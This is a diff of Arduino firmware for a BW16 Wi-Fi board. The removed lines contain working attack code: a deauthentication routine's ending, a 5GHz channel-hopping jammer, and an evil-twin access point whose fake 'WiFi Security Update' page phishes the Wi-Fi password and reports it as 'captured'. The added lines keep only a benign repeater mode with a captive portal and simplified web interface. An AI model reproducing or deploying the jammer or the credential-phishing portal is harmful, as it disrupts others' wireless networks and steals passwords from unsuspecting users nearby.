-    Serial.printf("[BW16] Deauth done: %d packets\n", pkts);
-    send_uart("{\"event\":\"success\",\"msg\":\"Deauth sent " + String(pkts) + " packets\"}");
-}
-
-/* =================== 5GHz JAMMER =================== */
-void cmd_jammer_start(int channel) {
-    if (attack_running) {
-        send_uart("{\"event\":\"error\",\"msg\":\"Busy\"}");
-        return;
-    }
-    
-    attack_running = true;
-    attack_op = "jammer";
-    
-    Serial.println(F("[BW16] 5GHz Jammer started"));
-    send_uart("{\"event\":\"jammer_started\",\"msg\":\"5GHz jammer active\"}");
-    
-    int channels[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165};
-    int num_ch = sizeof(channels) / sizeof(channels[0]);
-    int64_t pkts = 0;
-    unsigned long start = millis();
-    
-    uint8_t noise[24];
-    for (int i = 0; i < 24; i++) noise[i] = random(0, 255);
-    noise[18] = 0x40; // Probe request
-    
-    while (attack_running && (millis() - start) < 30000) {
-        for (int i = 0; i < 5 && attack_running; i++) {
-            int ch = channels[random(0, num_ch)];
-            WiFi.setChannel(ch, WIFI_SECOND_CHAN_NONE);
-            WiFi.sendPacket(noise, sizeof(noise), ch);
-            pkts++;
-            noise[random(0, 6)] = random(0, 255);
-        }
-        delay(1);
-        
-        if (pkts % 1000 == 0) {
-            send_uart("{\"event\":\"jammer_status\",\"pkts\":" + String(pkts) + "}");
-        }
-    }
-    
-    attack_running = false;
-    attack_op = "";
-    
-    Serial.printf("[BW16] Jammer stopped: %lld packets\n", (long long)pkts);
-    send_uart("{\"event\":\"jammer_stopped\",\"pkts\":" + String(pkts) + "}");
-}
-
-void cmd_jammer_stop() {
-    attack_running = false;
-    Serial.println(F("[BW16] Jammer stop requested"));
-}
-
-/* =================== EVILTWIN (SLAVE MODE) =================== */
-void cmd_eviltwin_start(const String &ssid, const String &bssid, int channel) {
-    if (eviltwin_active) {
-        send_uart("{\"event\":\"error\",\"msg\":\"EvilTwin already running\"}");
-        return;
-    }
-    
-    attack_ssid = ssid;
-    attack_channel = channel;
-    
-    Serial.printf("[BW16] EvilTwin: '%s' ch %d\n", ssid.c_str(), channel);
-    
-    WiFi.mode(WIFI_AP);
-    WiFi.softAP(ssid.c_str(), NULL, channel, 0, 1);
-    
-    eviltwin_server.begin(80);
-    eviltwin_active = true;
-    
-    String ip = WiFi.softAPIP().toString();
-    send_uart("{\"event\":\"eviltwin_started\",\"ssid\":\"" + ssid + "\",\"ip\":\"" + ip + "\"}");
-}
-
-void cmd_eviltwin_stop() {
-    if (eviltwin_active) {
-        eviltwin_server.stop();
-        WiFi.softAPdisconnect(true);
-        WiFi.mode(WIFI_OFF);
-        eviltwin_active = false;
-    }
-    send_uart("{\"event\":\"eviltwin_stopped\"}");
-}
-
-void eviltwin_handle_client() {
-    WiFiClient client = eviltwin_server.available();
-    if (!client) return;
-    
-    String request = "";
-    unsigned long t = millis();
-    while (client.connected() && (millis() - t) < 2000) {
-        if (client.available()) {
-            char c = client.read();
-            request += c;
-            if (request.endsWith("\r\n\r\n")) break;
-        }
-    }
-    
-    // Fishing page
-    String html = F("<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>");
-    html += F("<title>WiFi Update</title><style>");
-    html += F("*{margin:0;padding:0;box-sizing:border-box}");
-    html += F("body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}");
-    html += F(".card{background:white;border-radius:12px;padding:30px;max-width:400px;width:90%;box-shadow:0 4px 20px rgba(0,0,0,0.1)}");
-    html += F("h2{color:#333;text-align:center;margin-bottom:8px}");
-    html += F("p{color:#666;text-align:center;margin-bottom:20px;font-size:14px}");
-    html += F("input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;margin-bottom:16px;outline:none}");
-    html += F("input:focus{border-color:#007aff}");
-    html += F("button{width:100%;padding:14px;background:#007aff;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer}");
-    html += F("</style></head><body><div class='card'>");
-    html += F("<h2>📶 WiFi Security Update</h2>");
-    html += F("<p>Your router requires a firmware update.<br>Enter your WiFi password to continue.</p>");
-    html += F("<form method='POST' action='/login'>");
-    html += F("<input type='password' name='password' placeholder='WiFi Password' required>");
-    html += F("<button type='submit'>Update Now</button>");
-    html += F("</form></div></body></html>");
-    
-    client.println("HTTP/1.1 200 OK");
-    client.println("Content-Type: text/html");
-    client.println("Connection: close");
-    client.println();
-    client.println(html);
-    
-    // Handle POST
-    if (request.indexOf("POST") >= 0) {
-        String body = request.substring(request.indexOf("\r\n\r\n") + 4);
-        int idx = body.indexOf("password=");
-        if (idx >= 0) {
-            String pass = body.substring(idx + 9);
-            int amp = pass.indexOf("&");
-            if (amp >= 0) pass = pass.substring(0, amp);
-            pass.replace("+", " ");
-            pass.replace("%40", "@");
-            pass.replace("%23", "#");
-            
-            send_uart("{\"event\":\"captured\",\"ssid\":\"" + attack_ssid + "\",\"password\":\"" + pass + "\"}");
-            
-            client.println("HTTP/1.1 200 OK");
-            client.println("Content-Type: text/html");
-            client.println();
-            client.println(F("<!DOCTYPE html><html><body style='font-family:Arial;text-align:center;padding:50px'>"));
-            client.println(F("<h2 style='color:#4CAF50'>✅ Update Complete</h2><p>You may close this page.</p></body></html>"));
-        }
-    }
-    
-    delay(50);
-    client.stop();
-}
-
-void cmd_status() {
-    String json = "{\"event\":\"status\",\"mode\":\"slave\",\"info\":{";
-    json += "\"attack_running\":" + String(attack_running ? "true" : "false") + ",";
-    json += "\"attack_op\":\"" + attack_op + "\",";
-    json += "\"eviltwin\":" + String(eviltwin_active ? "true" : "false") + ",";
-    json += "\"heap\":" + String(ESP.getFreeHeap());
-    json += "}}";
-    send_uart(json);
+/* =================== ARDUINO LOOP =================== */
+void loop() {
+  if (current_mode == MODE_SLAVE) {
+    slave_loop();
+  } else {
+    repeater_loop();
+  }
 }
 
 /* =================== MODE SWITCHING =================== */
-void switch_to_repeater() {
-    // Stop all slave operations
-    attack_running = false;
-    if (eviltwin_active) {
-        eviltwin_server.stop();
-        WiFi.softAPdisconnect(true);
-        eviltwin_active = false;
-    }
-    
-    mode_switching = true;
-    mode_switch_start = millis();
-    
-    Serial.println(F("[BW16] Switching to REPEATER mode..."));
-    enter_repeater_mode();
-}
-
 void switch_to_slave() {
-    // Stop repeater
-    if (repeater_connected) {
-        WiFi.softAPdisconnect(true);
-        WiFi.disconnect();
-        repeater_connected = false;
-    }
-    repeater_web.stop();
-    
-    mode_switching = true;
-    mode_switch_start = millis();
-    
-    Serial.println(F("[BW16] Switching to SLAVE mode..."));
-    enter_slave_mode();
+  if (current_mode == MODE_SLAVE) return;
+  Serial.println(F("[BW16] Switching to SLAVE mode..."));
+  
+  // Stop repeater services
+  repeater_web.stop();
+  repeater_dns.stop();
+  
+  // Reset WiFi
+  WiFi.softAPdisconnect(true);
+  WiFi.disconnect();
+  delay(100);
+  
+  current_mode = MODE_SLAVE;
+  Serial.println(F("[BW16] SLAVE mode active"));
 }
 
-void enter_repeater_mode() {
-    Serial.println(F("[BW16] ===== REPEATER MODE ====="));
-    
-    // Start AP
-    WiFi.mode(WIFI_AP_STA);
-    WiFi.softAPConfig(repeater_ip, repeater_gw, repeater_subnet);
-    WiFi.softAP(REPEATER_AP_SSID, REPEATER_AP_PASS, REPEATER_AP_CH, 0, 1);
-    
-    // Setup web server
-    repeater_web.on("/", repeater_handle_root);
-    repeater_web.on("/api/scan", repeater_handle_scan);
-    repeater_web.on("/api/status", repeater_handle_status);
-    repeater_web.on("/api/connect", HTTP_POST, repeater_handle_connect);
-    repeater_web.on("/api/disconnect", repeater_handle_disconnect);
-    repeater_web.begin();
-    
-    Serial.printf("[BW16] Web UI: http://%d.%d.%d.%d\n",
-                  repeater_ip[0], repeater_ip[1], repeater_ip[2], repeater_ip[3]);
-    
-    // Initial scan
-    WiFi.scanNetworks(true);
-    repeater_last_scan = millis();
-    
-    current_mode = MODE_REPEATER;
-    mode_switching = false;
-}
-
-void enter_slave_mode() {
-    Serial.println(F("[BW16] ===== SLAVE MODE ====="));
-    
-    // Cleanup repeater
-    if (repeater_connected) {
-        WiFi.softAPdisconnect(true);
-        WiFi.disconnect();
-        repeater_connected = false;
-        repeater_target_ssid = "";
-        repeater_target_pass = "";
-    }
-    repeater_web.stop();
-    
-    WiFi.mode(WIFI_OFF);
-    
-    // Re-init UART
-    Serial1.begin(UART_BAUD, SERIAL_8N1, UART_RX_PIN, UART_TX_PIN);
-    uart_buffer = "";
-    
-    current_mode = MODE_SLAVE;
-    mode_switching = false;
-    
-    send_uart("{\"event\":\"ready\",\"mode\":\"slave\",\"msg\":\"Back in slave mode\"}");
-}
-
-/* =================== REPEATER MODE LOOP =================== */
-void repeater_loop() {
-    // Handle web clients
-    repeater_web.handleClient();
-    
-    // ===== AUTO-DETECT ESP32-S3 =====
-    // REPEATER মোডে থাকা অবস্থায় যদি UART (Serial1) এ
-    // কোনো ডাটা আসে, তাহলে বুঝব ESP32-S3 আবার চালু হয়েছে।
-    // স্বয়ংক্রিয়ভাবে SLAVE মোডে ফিরে যাব।
-    if (Serial1.available()) {
-        String data = "";
-        unsigned long timeout = millis();
-        while (Serial1.available() || (millis() - timeout) < 100) {
-            if (Serial1.available()) {
-                char c = Serial1.read();
-                data += c;
-                timeout = millis();
-            }
-        }
-        data.trim();
-        
-        if (data.length() > 0) {
-            Serial.printf("[BW16] UART detect (%d bytes): %s\n", data.length(), data.substring(0, 50).c_str());
-            Serial.println(F("[BW16] ESP32-S3 detected! Switching to SLAVE mode..."));
-            
-            switch_to_slave();
-            
-            // Process the received command
-            delay(200);
-            handle_uart_command(data);
-            return;
-        }
-    }
-    
-    // Auto-reconnect
-    if (repeater_connected && WiFi.status() != WL_CONNECTED) {
-        static unsigned long last_recon = 0;
-        if (millis() - last_recon > 10000) {
-            Serial.printf("[BW16] Reconnecting to '%s'...\n", repeater_target_ssid.c_str());
-            WiFi.begin(repeater_target_ssid.c_str(), repeater_target_pass.c_str());
-            last_recon = millis();
-        }
-    }
-    
-    // Auto-scan every 30s
-    if (millis() - repeater_last_scan > 30000 && !repeater_scan_busy) {
-        WiFi.scanNetworks(true);
-        repeater_last_scan = millis();
-    }
+void switch_to_repeater() {
+  if (current_mode == MODE_REPEATER) return;
+  Serial.println(F("[BW16] Switching to REPEATER mode..."));
+  
+  // Disconnect STA and softAP from slave mode
+  WiFi.disconnect();
+  WiFi.softAPdisconnect(true);
+  delay(100);
+  
+  // Start in AP mode for repeater config
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(repeater_ip, repeater_gw, repeater_subnet);
+  WiFi.softAP(REPEATER_AP_SSID, REPEATER_AP_PASS, REPEATER_AP_CH, 0, REPEATER_AP_MAX_CLIENTS);
+  
+  // Start DNS server for captive portal
+  repeater_dns.start(53, "*", repeater_ip);
+  
+  // Configure web server routes
+  repeater_web.on("/", repeater_handle_root);
+  repeater_web.on("/api/scan", repeater_handle_scan);
+  repeater_web.on("/api/status", repeater_handle_status);
+  repeater_web.on("/api/connect", HTTP_POST, repeater_handle_connect);
+  repeater_web.on("/api/disconnect", repeater_handle_disconnect);
+  repeater_web.begin();
+  
+  current_mode = MODE_REPEATER;
+  Serial.printf("[BW16] REPEATER AP '%s' ready at 192.168.1.1\n", REPEATER_AP_SSID);
 }
 
 /* =================== REPEATER WEB HANDLERS =================== */
 void repeater_handle_root() {
-    String html = R"rawliteral(
+  String html = R"rawliteral(
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>BW16 Repeater</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0f;color:#e0e0e0;min-height:100vh}
-.container{max-width:500px;margin:0 auto;padding:16px}
-.header{background:linear-gradient(135deg,#00d4ff,#007bff);padding:20px;border-radius:12px;margin-bottom:20px;text-align:center}
-.header h1{font-size:22px;color:#fff;margin-bottom:4px}
-.header p{font-size:13px;color:rgba(255,255,255,0.8)}
-.badge{display:inline-block;padding:3px 10px;border-radius:20px;font-size:11px;font-weight:600;margin-top:8px;background:#1a237e;color:#90caf9}
-.card{background:#141420;border-radius:12px;padding:16px;margin-bottom:16px;border:1px solid #2a2a3a}
-.card h2{font-size:16px;color:#00d4ff;margin-bottom:12px;border-bottom:1px solid #2a2a3a;padding-bottom:8px}
-.status-bar{display:flex;align-items:center;gap:10px;padding:12px;background:#1a1a2e;border-radius:8px;margin-bottom:12px}
-.status-bar .dot{width:12px;height:12px;border-radius:50%}
-.dot.green{background:#4caf50;box-shadow:0 0 8px rgba(76,175,80,0.5)}
-.dot.red{background:#f44336;box-shadow:0 0 8px rgba(244,67,54,0.5)}
-.dot.blue{background:#2196f3;box-shadow:0 0 8px rgba(33,150,243,0.5)}
-.info-row{display:flex;justify-content:space-between;padding:6px 0;font-size:13px;border-bottom:1px solid #1a1a2e}
-.info-row:last-child{border-bottom:none}
-.info-row .label{color:#888}
-.info-row .value{color:#e0e0e0;font-family:monospace}
-input,select{width:100%;padding:12px;background:#1a1a2e;border:1px solid #2a2a3a;border-radius:8px;color:#e0e0e0;font-size:14px;margin-bottom:10px;outline:none}
-input:focus,select:focus{border-color:#00d4ff}
-button{width:100%;padding:12px;background:linear-gradient(135deg,#00d4ff,#007bff);border:none;border-radius:8px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:transform 0.2s}
-button:hover{transform:translateY(-1px)}
-.btn-red{background:linear-gradient(135deg,#ff4444,#cc0000)}
-.btn-green{background:linear-gradient(135deg,#4caf50,#2e7d32)}
-.network-list{max-height:250px;overflow-y:auto;display:none}
-.network-item{display:flex;justify-content:space-between;align-items:center;padding:10px;background:#1a1a2e;border-radius:6px;margin-bottom:6px;cursor:pointer}
-.network-item:hover{background:#2a2a3a}
-.network-item .ssid{font-size:14px;font-weight:500}
-.network-item .info{font-size:11px;color:#888}
-.scanning{text-align:center;padding:20px;color:#888}
-</style>
+  <title>BW16 Repeater</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body{font-family:Arial;margin:20px;background:#111;color:#eee;text-align:center}
+    h1{color:#0f0}
+    .card{background:#222;border-radius:10px;padding:15px;margin:10px auto;max-width:400px}
+    button{background:#0a0;color:#fff;border:none;padding:10px 20px;border-radius:5px;margin:5px;cursor:pointer}
+    .danger{background:#a00}
+    input{width:90%;padding:8px;margin:5px;border-radius:5px;border:1px solid #555;background:#333;color:#fff}
+  </style>
 </head>
 <body>
-<div class="container">
-<div class="header">
-<h1>📡 BW16 Repeater</h1>
-<p>192.168.1.1 • Dual-Band 2.4/5GHz</p>
-<span class="badge">Standalone Mode</span>
-</div>
-<div class="card">
-<h2>⚡ Status</h2>
-<div class="status-bar"><span class="dot" id="sDot"></span><span id="sTxt">Loading...</span></div>
-<div id="sDet"></div>
-</div>
-<div class="card">
-<h2>📶 Connect</h2>
-<input type="text" id="ssid" placeholder="Select or type SSID" readonly onclick="document.getElementById('nList').style.display='block';scanNow()">
-<div id="nList" class="network-list"></div>
-<input type="password" id="pass" placeholder="WiFi Password">
-<select id="band"><option value="auto">Auto</option><option value="2.4">2.4GHz</option><option value="5">5GHz</option></select>
-<button onclick="connect()">🔗 Connect</button>
-<button class="btn-red" onclick="disconnect()" style="margin-top:8px">⛔ Disconnect</button>
-</div>
-<div class="card"><h2>👥 Clients</h2><div id="clients">None</div></div>
-</div>
-<script>
-function $(id){return document.getElementById(id)}
-function toast(m,t){let d=$('toast');if(!d){d=document.createElement('div');d.id='toast';d.style.cssText='position:fixed;bottom:20px;left:50%;transform:translateX(-50%);padding:12px 24px;border-radius:8px;z-index:1000;display:none';document.body.appendChild(d)}
-d.textContent=m;d.className='toast '+t;d.style.display='block';setTimeout(()=>d.style.display='none',3000)}
-function status(){fetch('/api/status').then(r=>r.json()).then(d=>{
-$('sDot').className='dot '+(d.connected?'green':'red');
-$('sTxt').textContent=d.connected?'✅ '+d.ssid:'❌ Disconnected';
-let h='<div class="info-row"><span class="label">AP</span><span class="value">192.168.1.1</span></div>';
-h+='<div class="info-row"><span class="label">AP SSID</span><span class="value">BW16-Repeater</span></div>';
-if(d.sta_ip)h+='<div class="info-row"><span class="label">WAN IP</span><span class="value">'+d.sta_ip+'</span></div>';
-h+='<div class="info-row"><span class="label">Clients</span><span class="value">'+(d.clients||0)+'</span></div>';
-$('sDet').innerHTML=h;
-let c='';if(d.client_list&&d.client_list.length>0){d.client_list.forEach(m=>{c+='<div style="padding:6px;background:#1a1a2e;border-radius:4px;margin:4px 0;font-size:12px;font-family:monospace">'+m+'</div>'})}else{c='<div style="color:#666">No clients</div>'}
-$('clients').innerHTML=c}).catch(()=>{})}
-function scanNow(){let l=$('nList');l.innerHTML='<div class="scanning">🔍 Scanning...</div>';
-fetch('/api/scan').then(r=>r.json()).then(d=>{let h='';
-if(d.networks&&d.networks.length>0){d.networks.forEach(n=>{
-h+='<div class="network-item" onclick="$(\'ssid\').value=\''+n.ssid.replace(/'/g,"\\'")+'\';$(\'nList\').style.display=\'none\'">';
-h+='<div><div class="ssid">'+n.ssid+'</div><div class="info">'+(n.is_5ghz?'5G':'2.4')+' Ch'+n.channel+'</div></div>';
-h+='<div style="font-size:12px;color:#aaa">'+n.rssi+'dBm</div></div>'})}else{h='<div style="padding:10px;color:#888;text-align:center">No networks</div>'}
-l.innerHTML=h}).catch(()=>{l.innerHTML='<div style="padding:10px;color:#f44">Failed</div>'})}
-function connect(){let s=$('ssid').value,p=$('pass').value,b=$('band').value;
-if(!s||!p){toast('Fill all fields','error');return}
-fetch('/api/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ssid:s,password:p,band:b})})
-.then(r=>r.json()).then(d=>toast(d.status==='ok'?'✅ Connected!':'❌ '+d.message,d.status==='ok'?'success':'error'))
-.catch(()=>toast('❌ Error','error'))}
-function disconnect(){fetch('/api/disconnect').then(()=>toast('Disconnected','info')).catch(()=>{})}
-setInterval(status,3000);status();scanNow();
-</script></body></html>
-    )rawliteral";
-    
-    repeater_web.send(200, "text/html", html);
+  <h1>📡 BW16 Repeater</h1>
+  <p>192.168.1.1 • Dual-Band 2.4/5GHz</p>
+  <p><small>Standalone Mode</small></p>
+  <div class="card">
+    <h2>⚡ Status</h2>
+    <div id="status">Loading...</div>
+  </div>
+  <div class="card">
+    <h2>📶 Connect</h2>
+    <input type="text" id="ssid" placeholder="SSID"><br>
+    <input type="password" id="password" placeholder="Password"><br>
+    <button onclick="doConnect()">🔗 Connect</button>
+    <button class="danger" onclick="doDisconnect()">⛔ Disconnect</button>
+  </div>
+  <div class="card">
+    <h2>👥 Clients</h2>
+    <div id="clients">None</div>
+  </div>
+  <script>
+    async function refresh(){
+      let r=await fetch('/api/status');
+      let d=await r.json();
+      document.getElementById('status').innerHTML = d.connected ? '✅ Connected to <b>'+d.ssid+'</b><br>IP: '+d.sta_ip : '❌ Not connected';
+      document.getElementById('clients').innerHTML = d.clients+' client(s)<br>'+d.client_list.join(', ');
+    }
+    async function doConnect(){
+      let ssid=document.getElementById('ssid').value;
+      let pass=document.getElementById('password').value;
+      let r=await fetch('/api/connect',{method:'POST',body:JSON.stringify({ssid:ssid,password:pass})});
+      let d=await r.json();
+      alert(d.msg);
+      refresh();
+    }
+    async function doDisconnect(){
+      await fetch('/api/disconnect');
+      refresh();
+    }
+    setInterval(refresh,3000);
+    refresh();
+  </script>
+</body>
+</html>
+  )rawliteral";
+  repeater_web.send(200, "text/html", html);
 }
 
 void repeater_handle_scan() {
-    repeater_scan_busy = true;
-    
-    int n = WiFi.scanComplete();
-    if (n == WIFI_SCAN_FAILED) {
-        WiFi.scanNetworks(true);
-        repeater_web.send(200, "application/json", "{\"networks\":[]}");
-        repeater_scan_busy = false;
-        return;
-    }
-    
-    String json = "{\"networks\":[";
-    bool first = true;
-    
-    for (int i = 0; i < n; i++) {
-        String ssid = WiFi.SSID(i);
-        if (ssid.length() == 0) continue;
-        
-        if (!first) json += ",";
-        first = false;
-        
-        ssid.replace("\"", "\\\"");
-        json += "{\"ssid\":\"" + ssid + "\",";
-        json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
-        json += "\"channel\":" + String(WiFi.channel(i)) + ",";
-        json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
-        json += "\"is_5ghz\":" + String(WiFi.channel(i) >= 36 ? "true" : "false") + "}";
-    }
-    json += "]}";
-    
-    WiFi.scanDelete();
-    repeater_web.send(200, "application/json", json);
+  repeater_scan_busy = true;
+  int n = WiFi.scanComplete();
+  if (n == WIFI_SCAN_FAILED) {
+    WiFi.scanNetworks(true);
+    repeater_web.send(200, "application/json", "{\"networks\":[]}");
     repeater_scan_busy = false;
+    return;
+  }
+  String json = "{\"networks\":[";
+  bool first = true;
+  for (int i = 0; i < n; i++) {
+    String ssid = WiFi.SSID(i);
+    if (ssid.length() == 0) continue;
+    if (!first) json += ",";
+    first = false;
+    ssid.replace("\"", "\\\"");
+    json += "{\"ssid\":\"" + ssid + "\",";
+    json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
+    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
+    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
+    json += "\"is_5ghz\":" + String(WiFi.channel(i) >= 36 ? "true" : "false") + "}";
+  }
+  json += "]}";
+  WiFi.scanDelete();
+  repeater_web.send(200, "application/json", json);
+  repeater_scan_busy = false;
 }
 
 void repeater_handle_status() {
-    String json = "{";
-    json += "\"connected\":" + String(repeater_connected ? "true" : "false") + ",";
-    json += "\"ssid\":\"" + repeater_target_ssid + "\",";
-    
-    if (repeater_connected) {
-        json += "\"sta_ip\":\"" + WiFi.localIP().toString() + "\",";
-        json += "\"rssi\":" + String(WiFi.RSSI()) + ",";
-    }
-    
-    int clients = WiFi.softAPgetStationNum();
-    json += "\"clients\":" + String(clients) + ",";
-    
-    json += "\"client_list\":[";
-    wifi_sta_list_t sta_list;
-    esp_wifi_ap_get_sta_list(&sta_list);
-    for (int i = 0; i < sta_list.num; i++) {
-        if (i > 0) json += ",";
-        char mac[18];
-        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
-                 sta_list.sta[i].mac[0], sta_list.sta[i].mac[1],
-                 sta_list.sta[i].mac[2], sta_list.sta[i].mac[3],
-                 sta_list.sta[i].mac[4], sta_list.sta[i].mac[5]);
-        json += "\"" + String(mac) + "\"";
-    }
-    json += "],";
-    
-    json += "\"uptime\":\"" + String(millis() / 1000) + "s\"";
-    json += "}";
-    
-    repeater_web.send(200, "application/json", json);
+  String json = "{";
+  json += "\"connected\":" + String(repeater_connected ? "true" : "false") + ",";
+  json += "\"ssid\":\"" + repeater_target_ssid + "\",";
+  if (repeater_connected) {
+    json += "\"sta_ip\":\"" + WiFi.localIP().toString() + "\",";
+    json += "\"rssi\":" + String(WiFi.RSSI()) + ",";
+  }
+  int clients = WiFi.softAPgetStationNum();
+  json += "\"clients\":" + String(clients) + ",";
+  json += "\"client_list\":[";
+  json += "],";
+  json += "\"uptime\":\"" + String(millis() / 1000) + "s\"";
+  json += "}";
+  repeater_web.send(200, "application/json", json);
 }
 
 void repeater_handle_connect() {
-    if (!repeater_web.hasArg("plain")) {
-        repeater_web.send(400, "application/json", "{\"status\":\"error\",\"msg\":\"No data\"}");
-        return;
-    }
-    
-    String body = repeater_web.arg("plain");
-    String ssid = "", pass = "";
-    
-    int s = body.indexOf("\"ssid\"");
-    if (s >= 0) {
-        s = body.indexOf(":", s + 6);
-        s = body.indexOf("\"", s + 1);
-        int e = body.indexOf("\"", s + 1);
-        if (s >= 0 && e > s) ssid = body.substring(s + 1, e);
-    }
-    
-    s = body.indexOf("\"password\"");
-    if (s >= 0) {
-        s = body.indexOf(":", s + 10);
-        s = body.indexOf("\"", s + 1);
-        int e = body.indexOf("\"", s + 1);
-        if (s >= 0 && e > s) pass = body.substring(s + 1, e);
-    }
-    
-    if (ssid.length() == 0 || pass.length() == 0) {
-        repeater_web.send(400, "application/json", "{\"status\":\"error\",\"msg\":\"Missing fields\"}");
-        return;
-    }
-    
-    repeater_target_ssid = ssid;
-    repeater_target_pass = pass;
-    
-    if (repeater_connected) {
-        WiFi.disconnect();
-        delay(500);
-    }
-    
-    WiFi.begin(ssid.c_str(), pass.c_str());
-    
-    bool ok = false;
-    for (int i = 0; i < 30; i++) {
-        delay(1000);
-        if (WiFi.status() == WL_CONNECTED) {
-            ok = true;
-            break;
-        }
-    }
-    
-    if (ok) {
-        repeater_connected = true;
-        String ap_ssid = "Repeater-" + ssid.substring(0, 12);
-        WiFi.softAPConfig(repeater_ip, repeater_gw, repeater_subnet);
-        WiFi.softAP(ap_ssid.c_str(), NULL, REPEATER_AP_CH, 0, 1);
-        
-        repeater_web.send(200, "application/json", "{\"status\":\"ok\",\"msg\":\"Connected to " + ssid + "\"}");
-    } else {
-        repeater_connected = false;
-        repeater_web.send(200, "application/json", "{\"status\":\"error\",\"msg\":\"Connection timeout\"}");
-    }
+  if (!repeater_web.hasArg("plain")) {
+    repeater_web.send(400, "application/json", "{\"status\":\"error\",\"msg\":\"No data\"}");
+    return;
+  }
+  String body = repeater_web.arg("plain");
+  String ssid = "", pass = "";
+  int s = body.indexOf("\"ssid\"");
+  if (s >= 0) {
+    s = body.indexOf(":", s + 6);
+    s = body.indexOf("\"", s + 1);
+    int e = body.indexOf("\"", s + 1);
+    if (s >= 0 && e > s) ssid = body.substring(s + 1, e);
+  }
+  s = body.indexOf("\"password\"");
+  if (s >= 0) {
+    s = body.indexOf(":", s + 10);
+    s = body.indexOf("\"", s + 1);
+    int e = body.indexOf("\"", s + 1);
+    if (s >= 0 && e > s) pass = body.substring(s + 1, e);
+  }
+  if (ssid.length() == 0) {
+    repeater_web.send(400, "application/json", "{\"status\":\"error\",\"msg\":\"Missing fields\"}");
+    return;
+  }
+  repeater_target_ssid = ssid;
+  repeater_target_pass = pass;
+  
+  if (repeater_connected) {
+    WiFi.disconnect();
+    delay(500);
+  }
+  
+  WiFi.begin(ssid.c_str(), pass.c_str());
+  bool ok = false;
+  for (int i = 0; i < 30; i++) {
+    delay(1000);
+    if (WiFi.status() == WL_CONNECTED) { ok = true; break; }
+  }
+  
+  if (ok) {
+    repeater_connected = true;
+    String ap_ssid = "Repeater-" + ssid.substring(0, 12);
+    WiFi.softAPConfig(repeater_ip, repeater_gw, repeater_subnet);
+    WiFi.softAP(ap_ssid.c_str(), NULL, 1, 0, 1);
+    repeater_web.send(200, "application/json", "{\"status\":\"ok\",\"msg\":\"Connected to " + ssid + "\"}");
+  } else {
+    repeater_connected = false;
+    repeater_web.send(200, "application/json", "{\"status\":\"error\",\"msg\":\"Connection timeout\"}");
+  }
 }
 
 void repeater_handle_disconnect() {
-    WiFi.softAPdisconnect(true);
-    WiFi.disconnect();
-    repeater_connected = false;
-    repeater_target_ssid = "";
-    repeater_target_pass = "";
-    repeater_web.send(200, "application/json", "{\"status\":\"ok\"}");
+  WiFi.softAPdisconnect(true);
+  WiFi.disconnect();
+  repeater_connected = false;
+  repeater_target_ssid = "";
+  repeater_target_pass = "";
+  repeater_web.send(200, "application/json", "{\"status\":\"ok\"}");
 }
